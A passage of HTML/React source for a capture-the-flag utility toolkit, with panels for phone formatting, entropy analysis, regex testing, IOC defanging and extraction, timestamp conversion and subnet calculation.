                    e('input', { type: 'text', value: domain, onChange: (ev) => setDomain(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }),
                    e('button', { onClick: gen, className: 'w-full px-4 py-3 bg-[#ff0055]/20 border border-[#ff0055] rounded text-[#ff0055] font-bold' }, 'GENERATE'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // PHONE FORMATTER
            if (tool === 'phone-formatter') {
const format = () => { const clean = input.replace(/\D/g, ''); setOutput([`${country} ${clean}`, `${country} (${clean.slice(0,3)}) ${clean.slice(3,6)}-${clean.slice(6)}`, `${country}-${clean.slice(0,3)}-${clean.slice(3,6)}-${clean.slice(6)}`, clean].join('\n')); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Phone Formatter'),
                    e('div', { className: 'grid grid-cols-4 gap-2' }, e('input', { type: 'text', value: country, onChange: (ev) => setCountry(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }), e('input', { type: 'text', value: input, onChange: (ev) => setInput(ev.target.value), className: 'col-span-3 px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' })),
                    e('button', { onClick: format, className: 'w-full px-4 py-3 bg-[#ff0055]/20 border border-[#ff0055] rounded text-[#ff0055] font-bold' }, 'FORMAT'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }


            // ENTROPY CHECK
            if (tool === 'entropy-check') {
                const compute = () => {
                    const s = input || '';
                    if (!s.length) { setEntropyScore(''); setOutput(''); return; }
                    // Shannon entropy
                    const freq = {};
                    for (const ch of s) freq[ch] = (freq[ch] || 0) + 1;
                    let ent = 0;
                    for (const k in freq) {
                        const p = freq[k] / s.length;
                        ent -= p * Math.log2(p);
                    }
                    const bitsPerChar = ent;
                    const hint = bitsPerChar > 4.5 ? 'High entropy (likely encrypted/compressed/random)' :
                                 bitsPerChar > 3.5 ? 'Medium entropy (could be encoded/compressed)' :
                                 'Low entropy (likely plain text / structured)';
                    setEntropyScore(bitsPerChar.toFixed(3));
                    setOutput(`Length: ${s.length}\nEntropy: ${bitsPerChar.toFixed(3)} bits/char\nHint: ${hint}`);
                };

                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-2', style: { color }}, 'Entropy / Randomness'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none', placeholder: 'Paste text, hex, base64...' }),
                    e('div', { className: 'flex gap-2' },
                        e('button', { onClick: compute, className: 'px-4 py-2 bg-[#00ff41]/20 hover:bg-[#00ff41]/30 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'ANALYZE'),
                        e('button', { onClick: () => copyToClipboard(output), className: 'px-4 py-2 bg-[#00ff41]/10 hover:bg-[#00ff41]/20 border border-[#00ff41]/60 rounded text-[#00ff41] font-bold' }, 'COPY')
                    ),
                    entropyScore && e('div', { className: 'text-sm text-gray-300' }, `Entropy: ${entropyScore} bits/char`),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // REGEX LAB
            if (tool === 'regex-lab') {
                const run = () => {
                    try {
                        const flags = (regexFlags || '').replace(/[^gimsuy]/g, '');
                        const reObj = new RegExp(regexPattern, flags.includes('g') ? flags : flags + 'g');
                        const matches = [];
                        let m;
                        const text = input || '';
                        while ((m = reObj.exec(text)) !== null) {
                            matches.push({
                                match: m[0],
                                index: m.index,
                                groups: m.slice(1)
                            });
                            if (m[0] === '') reObj.lastIndex++; // avoid infinite loop
                        }
                        if (!matches.length) { setOutput('No matches'); return; }
                        const lines = matches.map((x, i) =>
                            `${i+1}. @${x.index}: ${x.match}` + (x.groups.length ? ` | groups: [${x.groups.join(', ')}]` : '')
                        );
                        setOutput(lines.join('\n'));
                    } catch (e) {
                        setOutput('Regex error: ' + (e && e.message ? e.message : String(e)));
                    }
                };

                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-2', style: { color }}, 'Regex Lab'),
                    e('div', { className: 'grid grid-cols-4 gap-2' },
                        e('input', { type: 'text', value: regexPattern, onChange: (ev) => setRegexPattern(ev.target.value), className: 'col-span-3 px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'Pattern (no / /) e.g. flag\\{([^}]+)\\}' }),
                        e('input', { type: 'text', value: regexFlags, onChange: (ev) => setRegexFlags(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'flags e.g. gim' })
                    ),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none', placeholder: 'Paste text to search...' }),
                    e('div', { className: 'flex gap-2' },
                        e('button', { onClick: run, className: 'px-4 py-2 bg-[#00ff41]/20 hover:bg-[#00ff41]/30 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'RUN'),
                        e('button', { onClick: () => copyToClipboard(output), className: 'px-4 py-2 bg-[#00ff41]/10 hover:bg-[#00ff41]/20 border border-[#00ff41]/60 rounded text-[#00ff41] font-bold' }, 'COPY OUTPUT')
                    ),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // DEFANG / REFANG
            if (tool === 'defang-refang') {
                const transform = () => {
                    const s = input || '';
                    const defang = (t) => t
                        .replace(/\./g, '[.]')
                        .replace(/http:\/\//gi, 'hxxp://')
                        .replace(/https:\/\//gi, 'hxxps://')
                        .replace(/@/g, '[@]');
                    const refang = (t) => t
                        .replace(/\[\.\]/g, '.')
                        .replace(/hxxp:\/\//gi, 'http://')
                        .replace(/hxxps:\/\//gi, 'https://')
                        .replace(/\[@\]/g, '@');

                    const extract = (t) => {
                        const urls = t.match(/https?:\/\/[^\s"'<>()]+/gi) || [];
                        const ips  = t.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || [];
                        const domains = t.match(/\b(?:[a-z0-9-]+\.)+[a-z]{2,}\b/gi) || [];
                        const uniq = (arr) => Array.from(new Set(arr));
                        return [
                            'URLs:', ...uniq(urls),
                            '', 'IPs:', ...uniq(ips),
                            '', 'Domains:', ...uniq(domains)
                        ].join('\n');
                    };

                    if (iocMode === 'defang') setOutput(defang(s));
                    else if (iocMode === 'refang') setOutput(refang(s));
                    else setOutput(extract(s));
                };

                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-2', style: { color }}, 'Defang / Refang IOCs'),
                    e('div', { className: 'flex gap-2 flex-wrap' },
                        ['defang','refang','extract'].map(mode =>
                            e('button', { key: mode, onClick: () => setIocMode(mode), className: `px-3 py-2 rounded font-bold text-sm border ${iocMode===mode ? 'bg-[#00ff41]/20 border-[#00ff41] text-[#00ff41]' : 'bg-black/30 border-gray-700 text-gray-400'}` },
                              mode.toUpperCase()
                            )
                        ),
                        e('button', { onClick: transform, className: 'px-4 py-2 bg-[#00ff41]/20 hover:bg-[#00ff41]/30 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'RUN'),
                        e('button', { onClick: () => copyToClipboard(output), className: 'px-4 py-2 bg-[#00ff41]/10 hover:bg-[#00ff41]/20 border border-[#00ff41]/60 rounded text-[#00ff41] font-bold' }, 'COPY')
                    ),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none', placeholder: 'Paste URLs, domains, IPs...' }),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // TIMESTAMP CONVERTER
            if (tool === 'timestamp-converter') {
                const convert = () => {
                    const s = (tsInput || '').trim();
                    if (!s) { setOutput(''); return; }

                    // If numeric, treat as unix (sec or ms)
                    if (/^-?\d+$/.test(s)) {
                        const n = Number(s);
                        const ms = n > 1e12 ? n : n * 1000;
                        const d = new Date(ms);
                        if (isNaN(d.getTime())) { setOutput('Invalid timestamp'); return; }
                        setOutput([
                            `ISO: ${d.toISOString()}`,
                            `UTC: ${d.toUTCString()}`,
                            `Local: ${d.toString()}`,
                            `Unix (sec): ${Math.floor(ms/1000)}`,
                            `Unix (ms): ${ms}`
                        ].join('\n'));
                        return;
                    }

                    // Otherwise parse as date string
                    const d = new Date(s);
                    if (isNaN(d.getTime())) { setOutput('Could not parse date/time'); return; }
                    const ms = d.getTime();
                    setOutput([
                        `Unix (sec): ${Math.floor(ms/1000)}`,
                        `Unix (ms): ${ms}`,
                        `ISO: ${d.toISOString()}`,
                        `UTC: ${d.toUTCString()}`,
                        `Local: ${d.toString()}`
                    ].join('\n'));
                };

                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-2', style: { color }}, 'Timestamp Converter'),
                    e('input', { type: 'text', value: tsInput, onChange: (ev) => setTsInput(ev.target.value), className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'Unix seconds/ms OR date string (e.g., 2026-02-04T12:00:00Z)' }),
                    e('div', { className: 'flex gap-2' },
                        e('button', { onClick: convert, className: 'px-4 py-2 bg-[#00ff41]/20 hover:bg-[#00ff41]/30 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'CONVERT'),
                        e('button', { onClick: () => copyToClipboard(output), className: 'px-4 py-2 bg-[#00ff41]/10 hover:bg-[#00ff41]/20 border border-[#00ff41]/60 rounded text-[#00ff41] font-bold' }, 'COPY')
                    ),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // CIDR / SUBNET CALCULATOR
            if (tool === 'cidr-calculator') {
                const ipToInt = (ip) => ip.split('.').reduce((a, o) => (a<<8) + (Number(o)&255), 0) >>> 0;
                const intToIp = (n) => [n>>>24, (n>>>16)&255, (n>>>8)&255, n&255].join('.');
                const calc = () => {
                    try {
                        const ip = (cidrIp || '').trim();
                        const pfx = Number((cidrPrefix || '').trim());
                        if (!/^\d{1,3}(\.\d{1,3}){3}$/.test(ip) || isNaN(pfx) || pfx<0 || pfx>32) {
                            setOutput('Invalid IP or prefix'); return;
                        }
                        const ipInt = ipToInt(ip);
                        const mask = pfx === 0 ? 0 : (0xFFFFFFFF << (32 - pfx)) >>> 0;
                        const net = (ipInt & mask) >>> 0;
                        const bcast = (net | (~mask)) >>> 0;
                        const hosts = pfx >= 31 ? (pfx === 31 ? 2 : 1) : (bcast - net - 1);
                        const first = pfx >= 31 ? net : net + 1;
                        const last = pfx >= 31 ? bcast : bcast - 1;

                        setOutput([
                            `IP: ${ip}`,
                            `Prefix: /${pfx}`,
                            `Netmask: ${intToIp(mask)}`,
                            `Network: ${intToIp(net)}`,
                            `Broadcast: ${intToIp(bcast)}`,
                            `First host: ${intToIp(first)}`,
                            `Last host: ${intToIp(last)}`,
                            `Usable hosts: ${hosts}`
                        ].join('\n'));
                    } catch (e) {
                        setOutput('Error: ' + (e && e.message ? e.message : String(e)));
                    }
                };

                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-2', style: { color }}, 'CIDR/Subnet Calculator'),
                    e('div', { className: 'grid grid-cols-6 gap-2' },
                        e('input', { type: 'text', value: cidrIp, onChange: (ev) => setCidrIp(ev.target.value), className: 'col-span-4 px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'IP (e.g., 10.10.10.10)' }),
                        e('input', { type: 'number', value: cidrPrefix, onChange: (ev) => setCidrPrefix(ev.target.value), min: 0, max: 32, className: 'col-span-2 px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: '24' })
                    ),
                    e('div', { className: 'flex gap-2' },
                        e('button', { onClick: calc, className: 'px-4 py-2 bg-[#00ff41]/20 hover:bg-[#00ff41]/30 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'CALCULATE'),
                        e('button', { onClick: () => copyToClipboard(output), className: 'px-4 py-2 bg-[#00ff41]/10 hover:bg-[#00ff41]/20 border border-[#00ff41]/60 rounded text-[#00ff41] font-bold' }, 'COPY')
                    ),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-40 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            return e('div', { className: 'text-center py-12 text-gray-500' }, e(icons.Terminal, { className: 'w-16 h-16 mx-auto mb-4 opacity-50' }), e('p', { className: 'text-lg font-bold' }, 'Tool Ready'), e('p', { className: 'text-sm mt-2' }, 'Select a tool to begin'));
        }
        const mountApp = () => {
            const rootEl = document.getElementById('root');
            if (!rootEl) return;
            // React 18+
            if (ReactDOM.createRoot) {
                ReactDOM.createRoot(rootEl).render(React.createElement(CTFToolkit));
            } else {
                // Legacy fallback
                ReactDOM.render(React.createElement(CTFToolkit), rootEl);
            }
        };

        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', mountApp);
        } else {
            mountApp();
        }
    </script>
</body>
</html>
